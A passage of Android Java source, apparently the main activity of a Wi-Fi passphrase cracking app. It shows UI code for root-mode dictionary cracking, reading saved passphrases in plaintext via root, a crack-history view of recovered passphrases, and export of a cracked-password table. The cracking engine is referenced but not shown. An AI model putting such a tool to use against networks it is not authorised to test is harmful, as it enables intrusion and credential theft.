                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(rightMargin);
        lp.bottomMargin = px(4);
        return lp;
    }

    /** 填充设置页的模式说明卡片。切模式后会重新调用。 */
    private void fillModeInfo() {
        if (modeInfo == null) return;

            int m = Prefs.mode(this);
            StringBuilder sb = new StringBuilder();
            sb.append(L.s("当前: Root 模式（推荐）", "Current: root mode (recommended)")).append("\n\n");
            sb.append(L.s(
                    "通过 su 调用系统的 cmd wifi 命令，完全自动、不弹窗。\n"
                    + "实测约 1 秒/条，且进度和暂停都可控。\n"
                    + "需要设备已 root 并给本应用授权。\n"
                    + "（Shizuku 与免 Root 通道已在 1.9.24 移除：前者每次关联都要借 binder、"
                    + "后者每条候选都要弹一次系统确认框，都撑不起逐条字典遍历。）",
                    "Invokes the system's cmd wifi via su — fully automatic, no dialogs.\n"
                    + "Measured about 1 second per attempt, with precise progress and pause.\n"
                    + "Requires a rooted device with root granted to this app.\n"
                    + "(The Shizuku and root-free channels were removed in 1.9.24: they cannot "
                    + "sustain per-candidate dictionary traversal.)"));
            sb.append("\n\n").append(L.f("当前实测速度: %s 条/秒",
                    "Measured: %s per second", Prefs.avgRateLabel(this)));
            if (!Prefs.hasRateSample(this)) {
                sb.append(L.s("（还没有样本，这是模式默认值）",
                        " (no samples yet — mode default)"));
            }
            modeInfo.setText(sb.toString());
            modeInfo.setTextColor(ACCENT);

    }

    /**
     * 模式可用性检测。
     *
     * 现在改成调用 **引擎的通道自检** —— 它会把整条判定链实际跑一遍
     * 并逐条给出证据（命令能不能执行、返回什么、判定信号读不读得到）。
     * 之前在设置页只显示一句结论，用户没法判断到底是哪一环坏了。
     */
    private void refreshModeReady() {
        if (modeReadyLabel == null) return;
        final int m = Prefs.mode(this);
        modeReadyLabel.setTextColor(TEXT_DIM);
        modeReadyLabel.setText(modeName(m) + L.s("：正在检测…", ": checking…"));
        // 点一下重新检测。
        modeReadyLabel.setOnClickListener(v -> refreshModeReady());
        // 长按看完整自检证据
        modeReadyLabel.setOnLongClickListener(v -> {
            showChannelProbeDetail();
            return true;
        });

        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.RootProber.CheckResult r =
                    io.github.wlmosv_png.wpaforge.audit.RootProber.check(getApplicationContext());
            boolean ok = r.ok;
            String text = ok ? L.s("\u2713 \u5df2\u5c31\u7eea", "\u2713 ready")
                             : L.s("\u2717 ", "\u2717 ") + r.title;
            final String ft = modeName(m) + L.s("\uff1a", ": ") + text
                    + L.s("\uff08\u70b9\u6b64\u91cd\u6d4b\uff09", " (tap to re-check)");
            final boolean fok = ok;
            ui.post(() -> {
                if (modeReadyLabel == null) return;
                modeReadyLabel.setText(ft);
                modeReadyLabel.setTextColor(fok ? OK_GREEN : DANGER);
            });
        }, "wpaforge-modecheck").start();
    }

    /**
     * 弹出通道自检的完整证据。
     *
     * 用户点长按状态行就能看到：命令跑了多久、返回了什么、
     * 两个判定信号当前能不能读到值 —— 不用再来回问我。
     */
    private void showChannelProbeDetail() {
        final int m = Prefs.mode(this);
        new Thread(() -> {
            io.github.wlmosv_png.wpaforge.audit.CrackEngine eng =
                    new io.github.wlmosv_png.wpaforge.audit.CrackEngine(this, m);
            eng.setShellChannel(new io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel() {
                @Override
                public String exec(String cmd, long timeoutMs) {
                    return io.github.wlmosv_png.wpaforge.audit.RootProber
                            .exec(null, new String[]{"su", "-c", cmd}, timeoutMs);
                }
                @Override public String name() { return "Root"; }
            });
            io.github.wlmosv_png.wpaforge.audit.CrackEngine.ChannelProbe p = eng.probeChannel();
            StringBuilder sb = new StringBuilder();
            for (String line : p.steps) sb.append(line).append('\n');
            // 附上完整环境诊断（设备/权限/各判据层可读性）
            try {
                io.github.wlmosv_png.wpaforge.audit.EnvDiagnostics.Report r =
                        io.github.wlmosv_png.wpaforge.audit.EnvDiagnostics.run(
                                MainActivity.this, m, eng.getShellChannelForDiag());
                sb.append('\n').append(r.text);
            } catch (Throwable t) {
                sb.append("\n环境诊断失败: ").append(t.getClass().getSimpleName());
            }
            final String body = sb.toString().trim();
            final String title = (p.ok ? "✓ " : "✗ ") + p.summary;
            ui.post(() -> {
                NetDialog d = new NetDialog(MainActivity.this,
                        L.s("通道自检", "Channel self-check"), body);
                d.setPositive(L.s("知道了", "Got it"), null);
                d.show();
            });
        }, "wpaforge-probe").start();
    }

    /** 模式名（不带“模式”后缀，用于状态行前缀） */
    private String modeName(int m) {
        return "Root";
    }

    /** 圆角背景 */
    /**
     * 圆角背景 —— 统一走 UiKit。
     *
     * 之前这里返回静态 GradientDrawable，配合 setStateListAnimator(null)，
     * 结果是「按下去什么都没变」。现在可点元素自带水波纹，禁用态压暗。
     */
    private android.graphics.drawable.Drawable roundBg(int color, float radiusDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(color, dp(radiusDp));
    }

    /**
     * 带描边的圆角底。
     *
     * 为什么需要：纯暗底按钮在近黑背景上边界糊掉，
     * 加一条 1dp 的淡白边就能把「这是一块可点的东西」说清楚，
     * 又不像实心主色那样抢注意力。
     */
    private android.graphics.drawable.Drawable roundBgStroked(
            int fill, int edge, float radiusDp, float strokeDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit
                .rippleStroked(fill, edge, dp(radiusDp), px(strokeDp));
    }

    private void openUrl(String url) {
        try {
            startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW,
                    android.net.Uri.parse(url)));
        } catch (Exception e) {
            Toast.makeText(this, url, Toast.LENGTH_LONG).show();
        }
    }

    // ---------------- 本机已存 WiFi 自查 ----------------

    /** 语言选择 */
    private void showLanguagePicker() {
        NetDialog d = new NetDialog(this, L.s("语言", "Language"), null);
        d.addItem(L.s("跟随系统", "Follow system") + (L.getMode() == L.AUTO ? "   ✓" : ""),
                dd -> applyLanguage(L.AUTO));
        d.addItem(L.s("中文", "Chinese") + (L.getMode() == L.ZH ? "   ✓" : ""),
                dd -> applyLanguage(L.ZH));
        d.addItem(L.s("English", "English") + (L.getMode() == L.EN ? "   ✓" : ""),
                dd -> applyLanguage(L.EN));
        d.setNegative(L.s("取消", "Cancel"), null);
        d.show();
    }

    /** 切换语言后重建界面 */
    private void applyLanguage(int mode) {
        L.setMode(this, mode);
        // 重建 Activity 让所有文案生效
        android.content.Intent i = getIntent();
        finish();
        startActivity(i);
        overridePendingTransition(0, 0);
    }

    // ─────────────────────────── 本机已存 WiFi：列表 UI（2026-10-24 重做）───────────

    /** 最近一次读到的已存网络（过滤时重绘用；不改变读取与评分）。 */
    private java.util.List<SavedWifiReader.Saved> savedWifiList = new java.util.ArrayList<>();
    /** 列表容器（过滤只重建它的子视图）。 */
    private LinearLayout savedWifiListBox;
    /** 过滤模式：0 全部 / 1 弱口令(≥50) / 2 开放网络。 */
    private int savedWifiFilter = 0;
    private final TextView[] savedWifiChips = new TextView[3];
    private final int[] savedWifiChipCounts = new int[3];

    /**
     * 本机已存 WiFi —— 列表重做（用户反馈：口令一长就看不到）。
     *
     * <h3>改前的问题</h3>
     * 条目是 {@code NetDialog.addItem(...)} 的一行文本，而 addItem 会
     * {@code setSingleLine(true)} + {@code ellipsize(MIDDLE)} —— 于是
     * {@code fast_2345abcdef} 显示成 {@code fast_...2345}，**口令根本看不清**；
     * 39 个网络堆起来也没有任何层级。
     *
     * <h3>现在</h3>
     * 每行一张卡：SSID（可截断）+ 强度胶囊（分数档位色）；口令**独占一行、等宽、
     * 最多折三行、绝不省略**；第三行小字给长度与安全类型；点整行复制口令。
     * 顶部三枚过滤胶囊（全部 / 弱口令 ≥50 / 开放网络）只是本地过滤，读盘与评分不变。
     */
    private void showSavedWifiList(java.util.List<SavedWifiReader.Saved> list) {
        savedWifiList = list == null ? new java.util.ArrayList<>() : list;
        savedWifiFilter = 0;
        savedWifiChipCounts[0] = savedWifiList.size();
        savedWifiChipCounts[1] = 0;
        savedWifiChipCounts[2] = 0;
        for (SavedWifiReader.Saved sw : savedWifiList) {
            if (!sw.hasPassword()) {
                savedWifiChipCounts[2]++;
            } else if (SavedWifiReader.weaknessScore(sw.password) >= 50) {
                savedWifiChipCounts[1]++;
            }
        }

        NetDialog d = new NetDialog(this,
                L.f("本机已存 WiFi（%d 个）", "Saved Wi-Fi (%d)", savedWifiList.size()),
                L.s("口令由系统明文保存，这里只做本地展示、不上传。点任意一行可复制口令。",
                        "Passphrases are stored in plaintext by the system. "
                                + "Shown locally only, never uploaded. Tap a row to copy."));

        LinearLayout chips = new LinearLayout(this);
        chips.setOrientation(LinearLayout.HORIZONTAL);
        String[] names = {L.s("全部", "All"), L.s("弱口令 ≥50", "Weak ≥50"), L.s("开放网络", "Open")};
        for (int i = 0; i < 3; i++) {
            final int mode = i;
            TextView c = new TextView(this);
            c.setText(names[i] + " " + savedWifiChipCounts[i]);
            c.setTextSize(AmberTheme.FS_LABEL);
            c.setPadding(px(10), px(5), px(10), px(5));
            c.setOnClickListener(v -> {
                savedWifiFilter = mode;
                renderSavedWifiRows();
            });
            LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            clp.rightMargin = px(6);
            chips.addView(c, clp);
            savedWifiChips[i] = c;
        }
        d.addView(chips);

        savedWifiListBox = new LinearLayout(this);
        savedWifiListBox.setOrientation(LinearLayout.VERTICAL);
        d.addView(savedWifiListBox);
        renderSavedWifiRows();

        d.addHint(L.f("共 %d 个网络：弱口令 %d、开放 %d。分数越高越容易被猜中；口令只在本机显示。",
                "%d networks: %d weak, %d open. Higher score = easier to guess. Shown locally only.",
                savedWifiChipCounts[0], savedWifiChipCounts[1], savedWifiChipCounts[2]));
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();
    }

    /** 过滤胶囊外观（选中＝实心琥珀）。 */
    private void refreshSavedWifiChips() {
        for (int i = 0; i < savedWifiChips.length; i++) {
            TextView c = savedWifiChips[i];
            if (c == null) continue;
            boolean on = (i == savedWifiFilter);
            c.setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_DIM);
            c.setBackground(on
                    ? io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(ACCENT, dp(AmberTheme.RADIUS_CHIP))
                    : io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                            AmberTheme.CARD_2, BTN_2ND_EDGE, dp(AmberTheme.RADIUS_CHIP), dp(0.8f)));
        }
    }

    /** 按当前过滤重建行（**只影响显示**，不动读取与评分）。 */
    private void renderSavedWifiRows() {
        if (savedWifiListBox == null) return;
        savedWifiListBox.removeAllViews();
        int shown = 0;
        for (SavedWifiReader.Saved sw : savedWifiList) {
            boolean keep;
            if (savedWifiFilter == 1) {
                keep = sw.hasPassword() && SavedWifiReader.weaknessScore(sw.password) >= 50;
            } else if (savedWifiFilter == 2) {
                keep = !sw.hasPassword();
            } else {
                keep = true;
            }
            if (!keep) continue;
            savedWifiListBox.addView(savedWifiRow(sw));
            shown++;
        }
        if (shown == 0) {
            savedWifiListBox.addView(AmberTheme.emptyBox(this, dp,
                    L.s("这个筛选下没有网络", "Nothing under this filter"),
                    L.s("点「全部」看完整列表", "Tap All for the full list")));
        }
        refreshSavedWifiChips();
    }

    /**
     * 一行已存网络。
     *
     * <p>口令那行**必须**允许折行：这是这页存在的意义（看清自己在用的口令），
     * 所以刻意不设 singleLine、也不设省略号 —— 长口令最多折三行，绝不变成 `xx…yy`。
     */
    private View savedWifiRow(SavedWifiReader.Saved sw) {
        boolean open = !sw.hasPassword();
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(AmberTheme.rowBg(this, dp, AmberTheme.RADIUS_CARD));
        card.setPadding(px(14), px(12), px(14), px(12));
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        clp.bottomMargin = px(8);
        card.setLayoutParams(clp);

        // 第一行：SSID + 强度胶囊
        LinearLayout head = new LinearLayout(this);
        head.setOrientation(LinearLayout.HORIZONTAL);
        head.setGravity(Gravity.CENTER_VERTICAL);

        TextView ssid = new TextView(this);
        ssid.setText(sw.ssid);
        ssid.setTextSize(AmberTheme.FS_TITLE);
        ssid.setTextColor(TEXT);
        ssid.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        ssid.setSingleLine(true);
        ssid.setEllipsize(TextUtils.TruncateAt.END);   // 名字可以截断：右边还有胶囊
        head.addView(ssid, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        int score = open ? -1 : SavedWifiReader.weaknessScore(sw.password);
        TextView chip = new TextView(this);
        chip.setText(open ? L.s("开放网络", "Open") : (SavedWifiReader.weaknessLabel(score) + " " + score));
        chip.setTextSize(AmberTheme.FS_LABEL);
        chip.setTextColor(open ? AmberTheme.TEXT_DIM : savedWifiScoreColor(score));
        chip.setBackground(roundBg(open ? AmberTheme.CARD_3 : savedWifiScoreBg(score),
                AmberTheme.RADIUS_CHIP));
        chip.setPadding(px(8), px(3), px(8), px(3));
        LinearLayout.LayoutParams chlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        chlp.leftMargin = px(8);
        head.addView(chip, chlp);
        card.addView(head);

        // 第二行：口令本体（完整显示，最多折三行）
        TextView pw = new TextView(this);
        if (open) {
            pw.setText(L.s("（开放网络，无口令）", "(open network, no passphrase)"));
            pw.setTextSize(AmberTheme.FS_BODY);
            pw.setTextColor(AmberTheme.TEXT_FAINT);
        } else {
            pw.setText(sw.password);
            pw.setTextSize(13.5f);
            pw.setTextColor(TEXT);
            pw.setTypeface(Typeface.MONOSPACE);
        }
        pw.setSingleLine(false);      // ← 关键：不截断
        pw.setMaxLines(3);
        pw.setLineSpacing(px(3), 1f);
        pw.setTextIsSelectable(true);
        LinearLayout.LayoutParams plp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        plp.topMargin = px(6);
        card.addView(pw, plp);

        // 第三行：长度 / 安全类型 / 复制提示
        TextView meta = new TextView(this);
        String sec = sw.security == null || sw.security.isEmpty() ? "-" : sw.security;
        meta.setText(open
                ? L.f("安全类型 %s · 无需口令", "Security %s · no passphrase", sec)
                : L.f("长度 %d · 安全类型 %s · 点这一行复制口令",
                        "Length %d · %s · tap to copy", sw.password.length(), sec));
        meta.setTextSize(AmberTheme.FS_LABEL);
        meta.setTextColor(AmberTheme.TEXT_FAINT);
        LinearLayout.LayoutParams mlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        mlp.topMargin = px(4);
        card.addView(meta, mlp);

        if (!open) {
            card.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                    AmberTheme.CARD, AmberTheme.EDGE, dp(AmberTheme.RADIUS_CARD), dp(0.8f)));
            card.setOnClickListener(v -> copySavedWifiPassword(sw.ssid, sw.password));
        }
        return card;
    }

    /** 强度分档色（与观测页的信号档位色同风格：越弱越刺眼）。 */
    private int savedWifiScoreColor(int score) {
        if (score >= 70) return DANGER;
        if (score >= 50) return ACCENT;
        if (score >= 30) return AmberTheme.TEXT_DIM;
        return OK_GREEN;
    }

    private int savedWifiScoreBg(int score) {
        if (score >= 70) return AmberTheme.DANGER_SOFT_BG;
        if (score >= 50) return AmberTheme.WARN_BG;
        return AmberTheme.CARD_3;
    }

    /** 点整行复制口令（只写系统剪贴板，不落盘、不上传）。 */
    private void copySavedWifiPassword(String ssid, String pw) {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    getSystemService(CLIPBOARD_SERVICE);
            if (cm == null) throw new IllegalStateException("no clipboard");
            cm.setPrimaryClip(android.content.ClipData.newPlainText("wifi-passphrase", pw));
            Toast.makeText(this, L.f("已复制「%s」的口令", "Passphrase copied (%s)", ssid),
                    Toast.LENGTH_SHORT).show();
        } catch (Throwable t) {
            Toast.makeText(this, L.s("复制失败: ", "Copy failed: ")
                    + t.getClass().getSimpleName(), Toast.LENGTH_SHORT).show();
        }
    }

    /** 刷新观测页的已存 WiFi 卡片文案 */
    private void updateSavedWifiCard() {
        if (savedWifiCard == null) return;
        if (savedWifiTotal < 0) {
            savedWifiCard.setText(L.s(
                    "点击自查本机已保存的 WiFi 口令\n"
                    + "口令由系统明文保存，需 root 读取。\n"
                    + "只在本机展示，不上传。",
                    "Tap to audit saved Wi-Fi passphrases\n"
                    + "Passphrases are stored in plaintext; root is required.\n"
                    + "Shown locally only, never uploaded."));
            savedWifiCard.setTextColor(TEXT_DIM);
            return;
        }
        if (savedWifiTotal == 0) {
            savedWifiCard.setText(L.s("没有读到已保存的网络。\n点击重试。",
                    "No saved networks found.\nTap to retry."));
            savedWifiCard.setTextColor(TEXT_DIM);
            return;
        }
        boolean bad = savedWifiWeak > 0;
        savedWifiCard.setText(L.f(
                "已保存 %d 个网络，其中 %d 个弱口令\n点击查看明细\n"
                + "口令只在本机展示，不上传。",
                "%d saved networks, %d weak passphrases\nTap for details\n"
                + "Shown locally only, never uploaded.",
                savedWifiTotal, savedWifiWeak));
        savedWifiCard.setTextColor(bad ? DANGER : OK_GREEN);
    }

    private void showSavedWifi() {
        final NetDialog dlg = new NetDialog(this, L.s("本机已存 WiFi", "Saved Wi-Fi"),
                L.s("正在读取系统配置…", "Reading system configuration…"));
        dlg.setNegative(L.s("关闭", "Close"), null);
        dlg.show();

        new Thread(() -> {
            String issue = SavedWifiReader.checkAccess();
            if (!issue.isEmpty()) {
                ui.post(() -> {
                    savedWifiTotal = -2;
                    if (savedWifiCard != null) {
                        savedWifiCard.setText(L.s(
                                "无法读取：需要 root\n点击重试",
                                "Cannot read: root required\nTap to retry"));
                        savedWifiCard.setTextColor(DANGER);
                    }
                });
                ui.post(() -> dlg.dismiss());
                ui.post(() -> NetDialog.info(this, L.s("无法读取", "Cannot read"), issue
                        + "\n\n这项功能需要 root，用来读取系统保存的 WiFi 配置。"));
                return;
            }
            java.util.List<SavedWifiReader.Saved> list = SavedWifiReader.read();
            int weakCount = 0;
            for (SavedWifiReader.Saved sw : list) {
                if (sw.hasPassword() && SavedWifiReader.weaknessScore(sw.password) >= 50) weakCount++;
            }
            final int fWeak = weakCount;
            ui.post(() -> {
                savedWifiTotal = list.size();
                savedWifiWeak = fWeak;
                updateSavedWifiCard();
            });
            ui.post(() -> dlg.dismiss());
            ui.post(() -> {
                if (list.isEmpty()) {
                    NetDialog.info(this, L.s("本机已存 WiFi", "Saved Wi-Fi"), L.s("没有读到任何已保存的网络。", "No saved networks found."));
                    return;
                }
                showSavedWifiList(list);
            });
        }).start();
    }

    // ---------------- 破解记录 ----------------

    private void showHistory() {
        /* 读历史**必须放后台**：`load()` 对每条命中记录都要走一次
         * Android Keystore 解密（用户 107 条命中 → 107 次），在主线程上跑
         * 会明显卡一下。这一页确实需要明文（要显示口令），所以是搬线程而不是免解密。 */
        new Thread(() -> {
            final java.util.List<HistStore.Record> list = HistStore.load(MainActivity.this);
            ui.post(() -> showHistoryDialog(list));
        }, "wpaforge-hist").start();
    }

    private void showHistoryDialog(final java.util.List<HistStore.Record> list) {
        if (list.isEmpty()) {
            NetDialog.info(this, L.s("破解记录", "Crack history"), L.s("还没有记录。跑一次破解就会自动记下来。", "No records yet. One crack run will start recording automatically."));
            return;
        }
        int hits = 0;
        for (HistStore.Record r : list) if (r.hit) hits++;
        NetDialog d = new NetDialog(this, L.s("破解记录", "Crack history"),
                L.s("共 ", "Total ") + list.size() + L.f(" 条，成功 %s 条。", " records, %s succeeded.", hits));
        int show = Math.min(30, list.size());
        for (int i = 0; i < show; i++) {
            HistStore.Record r = list.get(i);
            String line = r.timeLabel() + "  " + r.ssid
                    + (r.hit ? "\n✓ " + r.displayPassphrase()
                             : L.s("\n✗ 未命中", "\n✗ no match"))
                    + L.f("   试了 %d 条 / %s", "   tried %d / %s", r.tested, r.durationLabel());
            d.addItem(line, null);
        }
        if (list.size() > show) d.addHint(L.s("只显示最近 ", "Showing most recent ") + show + " 条。");
        d.setDanger(L.s("清空记录", "Clear records"), dd -> {
            HistStore.clear(this);
            histSummary = null;
            Toast.makeText(this, L.s("已清空", "Cleared"), Toast.LENGTH_SHORT).show();
        });
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();
    }

    private void doExport() {
        new Thread(() -> {
            java.io.File txt = HistStore.exportText(this);
            java.io.File pw = HistStore.exportPasswords(this);
            ui.post(() -> {
                if (txt == null) {
                    NetDialog.info(this, L.s("导出失败", "Export failed"), L.s("没有可导出的记录，或写入失败。", "No records to export, or the write failed."));
                    return;
                }
                NetDialog d = new NetDialog(this, L.s("导出完成", "Export complete"),
                        "记录文件:\n" + txt.getAbsolutePath()
                        + "\n\n成功口令表:\n" + (pw != null ? pw.getAbsolutePath() : "无"));
                d.addHint(L.s("文件在应用私有目录，可用文件管理器访问 ", "Files are in the app's private directory, reachable via a file manager: ")
                        + "Android/data/io.github.wlmosv_png.wpaforge/files/");
                d.setPositive(L.s("知道了", "Got it"), null);
                d.show();
            });
        }).start();
    }

    // ---------------- 权限 ----------------

    /** 刷新权限状态行：逐项列出现在有/没有。 */
    /**
     * 权限状态展示。
     *
     * 启动时已自动申请过，所以这里只做两件事：
     *   1. 告诉用户「齐了」还是「缺什么」
     *   2. 只有确实缺、且系统不会再弹（被永久拒绝）时，
     *      才露出「去系统设置里允许」按钮
     *
     * 齐全时不显示按钮 —— 没缺东西还给个申请入口是纯噪音。
     */
    private void refreshPermLabel() {
        if (permLabel == null) return;
        boolean loc = grantedOrFalse(android.Manifest.permission.ACCESS_FINE_LOCATION);
        boolean near = Build.VERSION.SDK_INT < 33
                || grantedOrFalse("android.permission.NEARBY_WIFI_DEVICES");
        // 定位开关：不在应用权限里，permFixBtn 帮不上忙（系统设置页没有这一项），只在文案里说明。
        boolean locSwitch = scanner == null || scanner.isLocationEnabled();
        boolean allOk = loc && near && locSwitch;

        StringBuilder sb = new StringBuilder();
        sb.append(permLine(android.Manifest.permission.ACCESS_FINE_LOCATION,
                L.s("定位（读取 SSID / 扫描）", "Location (read SSID / scan)")));
        if (Build.VERSION.SDK_INT >= 33) {
            sb.append('\n').append(permLine("android.permission.NEARBY_WIFI_DEVICES",
                    L.s("附近设备（扫描）", "Nearby devices (scan)")));
        }
        // 定位开关是系统级开关，不在应用权限页里，所以单独一行写清楚去哪儿开。
        sb.append('\n');
        sb.append("  ").append(locSwitch ? "✓ " : "✗ ").append(L.s("系统定位开关（必须打开）",
                "System location toggle (must be on)"));
        if (!locSwitch) {
            sb.append(L.s(" —— 关着时扫描结果一定是空的，权限给了也一样。请下拉通知栏打开「定位」（系统设置页里没有这一项）。",
                    " - scans are always empty while it is off, even with permissions granted; turn it on from Quick Settings."));
        }
        sb.append('\n');
        if (allOk) {
            sb.append(L.s("已就绪，无需操作。", "All set — nothing to do."));
        } else {
            sb.append(L.s("缺少上面标 ✗ 的权限，扫描会拿不到数据。\n"
                            + "若点了没反应，说明系统已不再弹窗，请用下方按钮去设置里允许。",
                    "Missing the ✗ items above; scanning will return no data.\n"
                            + "If nothing pops up, the system stopped asking — "
                            + "use the button below to allow it in Settings."));
        }
        permLabel.setText(sb.toString());

        if (permFixBtn != null) {
            permFixBtn.setVisibility(allOk ? View.GONE : View.VISIBLE);
        }
    }

    /** 权限是否已授予；异常一律当未授予 */
    private boolean grantedOrFalse(String perm) {
        try {
            return checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) {
            return false;
        }
    }

    private String permLine(String perm, String label) {
        boolean ok;
        try {
            ok = checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) {
            ok = false;
        }
        return (ok ? "✓ " : "✗ ") + label;
    }

    /** 跳到系统「应用信息」页，手动开权限。 */
    private void openAppSettings() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Throwable t) {
            Toast.makeText(this, L.s("无法打开系统设置页", "Cannot open app settings"),
                    Toast.LENGTH_SHORT).show();
        }
    }

    private void requestPermsIfNeeded() {
        List<String> need = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= 33) {
            need.add("android.permission.NEARBY_WIFI_DEVICES");
        }
        need.add(Manifest.permission.ACCESS_FINE_LOCATION);
        List<String> ask = new ArrayList<>();
        for (String p : need) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) ask.add(p);
        }
        if (!ask.isEmpty()) {
            if (Build.VERSION.SDK_INT >= 23) {
                requestPermissions(ask.toArray(new String[0]), 1001);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        // 权限请求返回后刷新设置页那行状态
        if (code == 1001 || code == 1003) {
            if (permLabel != null) refreshPermLabel();
        }
        if (scanner != null) scanner.emit();
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkBackgroundStall();
        // 回前台：目标/字典的显示与「权威」对齐一次（后台跑过的任务会在这里补回来）
        restoreSelectionFromAuthority();
        refreshQueue();          // 队列可能也是旧的（后台跑完）→ 重读并重画状态行
        if (currentTab == 0) {
            // 从后台回来要把雷达动画接上，否则会停在最后一帧
            if (radar != null) radar.startSpin();
            if (scanner != null) scanner.start();
        }
        // 每次回到前台都复查权限：
        //   1. 用户可能刚从系统设置里把权限打开
        //   2. onCreate 里申请过一次不代表成功（有些 ROM 在前台未就绪时会丢弃请求）
        if (permLabel != null) refreshPermLabel();
        requestPermsIfNeeded();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (scanner != null) scanner.stop();
        // 停掉动画，避免后台空转耗电
        if (radar != null) radar.stopSpin();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scanner != null) scanner.stop();
        if (engine != null) engine.cancel();
        if (serviceBound) {
            try {
                if (crackService != null) crackService.removeCallback(svcCallback);
                unbindService(svcConn);
            } catch (Exception ignored) {}
            serviceBound = false;
        }
    }
}
